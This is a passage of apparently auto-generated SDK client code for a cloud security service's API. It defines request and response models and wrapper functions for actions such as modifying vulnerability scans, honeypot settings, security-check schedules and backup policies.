  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyOpenLogShipper',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyOpenLogShipper(request: ModifyOpenLogShipperRequest): ModifyOpenLogShipperResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyOpenLogShipperWithOptions(request, runtime);
}

model ModifyOperateVulRequest {
  info?: string(name='Info'),
  operateType?: string(name='OperateType'),
  reason?: string(name='Reason'),
  type?: string(name='Type'),
}

model ModifyOperateVulResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyOperateVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyOperateVulResponseBody(name='body'),
}

async function modifyOperateVulWithOptions(request: ModifyOperateVulRequest, runtime: Util.RuntimeOptions): ModifyOperateVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyOperateVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyOperateVul(request: ModifyOperateVulRequest): ModifyOperateVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyOperateVulWithOptions(request, runtime);
}

model ModifyPropertyScheduleConfigRequest {
  scheduleTime?: string(name='ScheduleTime'),
  type?: string(name='Type'),
}

model ModifyPropertyScheduleConfigResponseBody = {
  modifyResult?: boolean(name='ModifyResult'),
  requestId?: string(name='RequestId'),
}

model ModifyPropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyPropertyScheduleConfigResponseBody(name='body'),
}

async function modifyPropertyScheduleConfigWithOptions(request: ModifyPropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): ModifyPropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scheduleTime)) {
    query['ScheduleTime'] = request.scheduleTime;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyPropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyPropertyScheduleConfig(request: ModifyPropertyScheduleConfigRequest): ModifyPropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyPropertyScheduleConfigWithOptions(request, runtime);
}

model ModifyPushAllTaskRequest {
  sourceIp?: string(name='SourceIp'),
  tasks?: string(name='Tasks'),
  uuids?: string(name='Uuids'),
}

model ModifyPushAllTaskResponseBody = {
  pushTaskRsp?: {
    pushTaskResultList?: [ 
      {
        groupId?: long(name='GroupId'),
        instanceId?: string(name='InstanceId'),
        instanceName?: string(name='InstanceName'),
        ip?: string(name='Ip'),
        message?: string(name='Message'),
        online?: boolean(name='Online'),
        osVersion?: string(name='OsVersion'),
        region?: string(name='Region'),
        success?: boolean(name='Success'),
        uuid?: string(name='Uuid'),
      }
    ](name='PushTaskResultList'),
  }(name='PushTaskRsp'),
  requestId?: string(name='RequestId'),
}

model ModifyPushAllTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyPushAllTaskResponseBody(name='body'),
}

async function modifyPushAllTaskWithOptions(request: ModifyPushAllTaskRequest, runtime: Util.RuntimeOptions): ModifyPushAllTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.tasks)) {
    query['Tasks'] = request.tasks;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyPushAllTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyPushAllTask(request: ModifyPushAllTaskRequest): ModifyPushAllTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyPushAllTaskWithOptions(request, runtime);
}

model ModifyRiskCheckStatusRequest {
  itemId?: long(name='ItemId'),
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
  taskId?: long(name='TaskId'),
}

model ModifyRiskCheckStatusResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyRiskCheckStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRiskCheckStatusResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request ModifyRiskCheckStatusRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyRiskCheckStatusResponse
 */
// Deprecated
async function modifyRiskCheckStatusWithOptions(request: ModifyRiskCheckStatusRequest, runtime: Util.RuntimeOptions): ModifyRiskCheckStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.itemId)) {
    query['ItemId'] = request.itemId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyRiskCheckStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request ModifyRiskCheckStatusRequest
  * @return ModifyRiskCheckStatusResponse
 */
// Deprecated
async function modifyRiskCheckStatus(request: ModifyRiskCheckStatusRequest): ModifyRiskCheckStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyRiskCheckStatusWithOptions(request, runtime);
}

model ModifyRiskSingleResultStatusRequest {
  ids?: [ string ](name='Ids'),
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
  taskId?: long(name='TaskId'),
}

model ModifyRiskSingleResultStatusResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyRiskSingleResultStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRiskSingleResultStatusResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request ModifyRiskSingleResultStatusRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyRiskSingleResultStatusResponse
 */
// Deprecated
async function modifyRiskSingleResultStatusWithOptions(request: ModifyRiskSingleResultStatusRequest, runtime: Util.RuntimeOptions): ModifyRiskSingleResultStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyRiskSingleResultStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request ModifyRiskSingleResultStatusRequest
  * @return ModifyRiskSingleResultStatusResponse
 */
// Deprecated
async function modifyRiskSingleResultStatus(request: ModifyRiskSingleResultStatusRequest): ModifyRiskSingleResultStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyRiskSingleResultStatusWithOptions(request, runtime);
}

model ModifySecurityCheckScheduleConfigRequest {
  daysOfWeek?: string(name='DaysOfWeek'),
  endTime?: int32(name='EndTime'),
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
  startTime?: int32(name='StartTime'),
}

model ModifySecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifySecurityCheckScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifySecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
  * @deprecated
  *
  * @param request ModifySecurityCheckScheduleConfigRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifySecurityCheckScheduleConfigResponse
 */
// Deprecated
async function modifySecurityCheckScheduleConfigWithOptions(request: ModifySecurityCheckScheduleConfigRequest, runtime: Util.RuntimeOptions): ModifySecurityCheckScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.daysOfWeek)) {
    query['DaysOfWeek'] = request.daysOfWeek;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifySecurityCheckScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * @deprecated
  *
  * @param request ModifySecurityCheckScheduleConfigRequest
  * @return ModifySecurityCheckScheduleConfigResponse
 */
// Deprecated
async function modifySecurityCheckScheduleConfig(request: ModifySecurityCheckScheduleConfigRequest): ModifySecurityCheckScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySecurityCheckScheduleConfigWithOptions(request, runtime);
}

model ModifySecurityEventMarkMissIndividuallyRequest {
  deleteMarkMissParam?: string(name='DeleteMarkMissParam'),
  from?: string(name='From'),
  insertMarkMissParam?: string(name='InsertMarkMissParam'),
  lang?: string(name='Lang'),
  sourceIp?: string(name='SourceIp'),
}

model ModifySecurityEventMarkMissIndividuallyResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
  timeCost?: long(name='TimeCost'),
}

model ModifySecurityEventMarkMissIndividuallyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifySecurityEventMarkMissIndividuallyResponseBody(name='body'),
}

async function modifySecurityEventMarkMissIndividuallyWithOptions(request: ModifySecurityEventMarkMissIndividuallyRequest, runtime: Util.RuntimeOptions): ModifySecurityEventMarkMissIndividuallyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.deleteMarkMissParam)) {
    body['DeleteMarkMissParam'] = request.deleteMarkMissParam;
  }
  if (!Util.isUnset(request.from)) {
    body['From'] = request.from;
  }
  if (!Util.isUnset(request.insertMarkMissParam)) {
    body['InsertMarkMissParam'] = request.insertMarkMissParam;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'ModifySecurityEventMarkMissIndividually',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifySecurityEventMarkMissIndividually(request: ModifySecurityEventMarkMissIndividuallyRequest): ModifySecurityEventMarkMissIndividuallyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifySecurityEventMarkMissIndividuallyWithOptions(request, runtime);
}

model ModifyStartVulScanRequest {
  types?: string(name='Types'),
  uuids?: string(name='Uuids'),
}

model ModifyStartVulScanResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyStartVulScanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStartVulScanResponseBody(name='body'),
}

async function modifyStartVulScanWithOptions(request: ModifyStartVulScanRequest, runtime: Util.RuntimeOptions): ModifyStartVulScanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStartVulScan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyStartVulScan(request: ModifyStartVulScanRequest): ModifyStartVulScanResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStartVulScanWithOptions(request, runtime);
}

model ModifyStrategyRequest {
  customType?: string(name='CustomType'),
  cycleDays?: string(name='CycleDays'),
  cycleStartTime?: string(name='CycleStartTime'),
  endTime?: string(name='EndTime'),
  id?: string(name='Id'),
  name?: string(name='Name'),
  riskCustomParams?: string(name='RiskCustomParams'),
  riskSubTypeName?: string(name='RiskSubTypeName'),
  sourceIp?: string(name='SourceIp'),
  startTime?: string(name='StartTime'),
  targetType?: string(name='TargetType'),
}

model ModifyStrategyResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode'),
  requestId?: string(name='RequestId'),
  result?: {
    strategyId?: int32(name='StrategyId'),
  }(name='Result'),
  success?: boolean(name='Success'),
}

model ModifyStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStrategyResponseBody(name='body'),
}

async function modifyStrategyWithOptions(request: ModifyStrategyRequest, runtime: Util.RuntimeOptions): ModifyStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.customType)) {
    query['CustomType'] = request.customType;
  }
  if (!Util.isUnset(request.cycleDays)) {
    query['CycleDays'] = request.cycleDays;
  }
  if (!Util.isUnset(request.cycleStartTime)) {
    query['CycleStartTime'] = request.cycleStartTime;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.riskCustomParams)) {
    query['RiskCustomParams'] = request.riskCustomParams;
  }
  if (!Util.isUnset(request.riskSubTypeName)) {
    query['RiskSubTypeName'] = request.riskSubTypeName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyStrategy(request: ModifyStrategyRequest): ModifyStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStrategyWithOptions(request, runtime);
}

model ModifyStrategyTargetRequest {
  config?: string(name='Config'),
  sourceIp?: string(name='SourceIp'),
  target?: string(name='Target'),
  type?: string(name='Type'),
}

model ModifyStrategyTargetResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyStrategyTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStrategyTargetResponseBody(name='body'),
}

async function modifyStrategyTargetWithOptions(request: ModifyStrategyTargetRequest, runtime: Util.RuntimeOptions): ModifyStrategyTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyStrategyTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyStrategyTarget(request: ModifyStrategyTargetRequest): ModifyStrategyTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyStrategyTargetWithOptions(request, runtime);
}

model ModifyTagWithUuidRequest {
  machineTypes?: string(name='MachineTypes'),
  tagId?: string(name='TagId'),
  tagList?: string(name='TagList'),
  uuidList?: string(name='UuidList'),
}

model ModifyTagWithUuidResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyTagWithUuidResponseBody(name='body'),
}

async function modifyTagWithUuidWithOptions(request: ModifyTagWithUuidRequest, runtime: Util.RuntimeOptions): ModifyTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.tagId)) {
    query['TagId'] = request.tagId;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyTagWithUuid(request: ModifyTagWithUuidRequest): ModifyTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyTagWithUuidWithOptions(request, runtime);
}

model ModifyUniBackupPolicyRequest {
  accountName?: string(name='AccountName'),
  accountPassword?: string(name='AccountPassword'),
  fullPlan?: map[string]any(name='FullPlan'),
  incPlan?: map[string]any(name='IncPlan'),
  policyId?: long(name='PolicyId'),
  policyName?: string(name='PolicyName'),
  policyStatus?: string(name='PolicyStatus'),
  retention?: int32(name='Retention'),
  speedLimiter?: long(name='SpeedLimiter'),
}

model ModifyUniBackupPolicyShrinkRequest {
  accountName?: string(name='AccountName'),
  accountPassword?: string(name='AccountPassword'),
  fullPlanShrink?: string(name='FullPlan'),
  incPlanShrink?: string(name='IncPlan'),
  policyId?: long(name='PolicyId'),
  policyName?: string(name='PolicyName'),
  policyStatus?: string(name='PolicyStatus'),
  retention?: int32(name='Retention'),
  speedLimiter?: long(name='SpeedLimiter'),
}

model ModifyUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyUniBackupPolicyResponseBody(name='body'),
}

async function modifyUniBackupPolicyWithOptions(tmpReq: ModifyUniBackupPolicyRequest, runtime: Util.RuntimeOptions): ModifyUniBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyUniBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.fullPlan)) {
    request.fullPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.fullPlan, 'FullPlan', 'json');
  }
  if (!Util.isUnset(tmpReq.incPlan)) {
    request.incPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.incPlan, 'IncPlan', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.accountName)) {
    query['AccountName'] = request.accountName;
  }
  if (!Util.isUnset(request.accountPassword)) {
    query['AccountPassword'] = request.accountPassword;
  }
  if (!Util.isUnset(request.fullPlanShrink)) {
    query['FullPlan'] = request.fullPlanShrink;
  }
  if (!Util.isUnset(request.incPlanShrink)) {
    query['IncPlan'] = request.incPlanShrink;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  if (!Util.isUnset(request.policyStatus)) {
    query['PolicyStatus'] = request.policyStatus;
  }
  if (!Util.isUnset(request.retention)) {
    query['Retention'] = request.retention;
  }
  if (!Util.isUnset(request.speedLimiter)) {
    query['SpeedLimiter'] = request.speedLimiter;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyUniBackupPolicy(request: ModifyUniBackupPolicyRequest): ModifyUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyUniBackupPolicyWithOptions(request, runtime);
}

model ModifyVpcHoneyPotRequest {
  honeyPotAction?: string(name='HoneyPotAction'),
  vpcId?: string(name='VpcId'),
}

model ModifyVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVpcHoneyPotResponseBody(name='body'),
}

async function modifyVpcHoneyPotWithOptions(request: ModifyVpcHoneyPotRequest, runtime: Util.RuntimeOptions): ModifyVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeyPotAction)) {
    query['HoneyPotAction'] = request.honeyPotAction;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVpcHoneyPot(request: ModifyVpcHoneyPotRequest): ModifyVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVpcHoneyPotWithOptions(request, runtime);
}

model ModifyVulConfigRequest {
  config?: string(name='Config'),
  type?: string(name='Type'),
}

model ModifyVulConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyVulConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulConfigResponseBody(name='body'),
}

async function modifyVulConfigWithOptions(request: ModifyVulConfigRequest, runtime: Util.RuntimeOptions): ModifyVulConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulConfig(request: ModifyVulConfigRequest): ModifyVulConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulConfigWithOptions(request, runtime);
}

model ModifyVulTargetRequest {
  config?: string(name='Config'),
  target?: string(name='Target'),
}

model ModifyVulTargetResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyVulTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulTargetResponseBody(name='body'),
}

async function modifyVulTargetWithOptions(request: ModifyVulTargetRequest, runtime: Util.RuntimeOptions): ModifyVulTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulTarget(request: ModifyVulTargetRequest): ModifyVulTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulTargetWithOptions(request, runtime);
}

model ModifyVulTargetConfigRequest {
  config?: string(name='Config'),
  sourceIp?: string(name='SourceIp'),
  type?: string(name='Type'),
  uuid?: string(name='Uuid'),
}

model ModifyVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyVulTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulTargetConfigResponseBody(name='body'),
}

async function modifyVulTargetConfigWithOptions(request: ModifyVulTargetConfigRequest, runtime: Util.RuntimeOptions): ModifyVulTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulTargetConfig(request: ModifyVulTargetConfigRequest): ModifyVulTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulTargetConfigWithOptions(request, runtime);
}

model ModifyVulWhitelistTargetRequest {
  id?: long(name='Id'),
  reason?: string(name='Reason'),
  sourceIp?: string(name='SourceIp'),
  targetInfo?: string(name='TargetInfo'),
}

model ModifyVulWhitelistTargetResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyVulWhitelistTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulWhitelistTargetResponseBody(name='body'),
}

async function modifyVulWhitelistTargetWithOptions(request: ModifyVulWhitelistTargetRequest, runtime: Util.RuntimeOptions): ModifyVulWhitelistTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulWhitelistTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
